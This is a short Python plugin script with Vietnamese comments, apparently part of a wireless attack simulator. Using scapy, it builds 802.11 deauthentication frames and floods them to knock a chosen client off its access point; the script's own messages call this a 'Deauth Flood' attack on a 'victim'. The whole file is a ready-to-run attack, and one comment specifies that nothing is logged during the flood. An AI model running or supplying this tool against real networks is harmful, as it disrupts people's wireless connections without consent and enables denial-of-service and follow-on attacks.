# plugins/deauth_test.py
import sys
import time
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

def main():
    # Nhận tham số từ Trạm điều phối (simulator.py)
    if len(sys.argv) < 5:
        print("[-] Lỗi: Thiếu tham số.")
        sys.exit(1)
        
    interface = sys.argv[1]
    router_mac = sys.argv[2].lower()
    client_mac = sys.argv[3].lower()
    count = int(sys.argv[4])

    print(f"[*] Bắt đầu Tấn công Deauth Flood.")
    print(f"    - Mục tiêu AP: {router_mac}")
    print(f"    - Nạn nhân : {client_mac}")
    
    # Tạo gói tin ngắt kết nối
    pkt = RadioTap() / Dot11(addr1=client_mac, addr2=router_mac, addr3=router_mac) / Dot11Deauth(reason=7)
    
    try:
        # Bắn ra không khí, KHÔNG GHI LOG Ở ĐÂY
        print(f"[+] Đang bơm {count} gói Deauth vào không gian vô tuyến...")
        sendp(pkt, iface=interface, count=count, inter=0.01, verbose=False)
        print("[+] Hoàn tất xả đạn.")
    except KeyboardInterrupt:
        print("\n[!] Dừng tấn công.")

if __name__ == "__main__":
    main()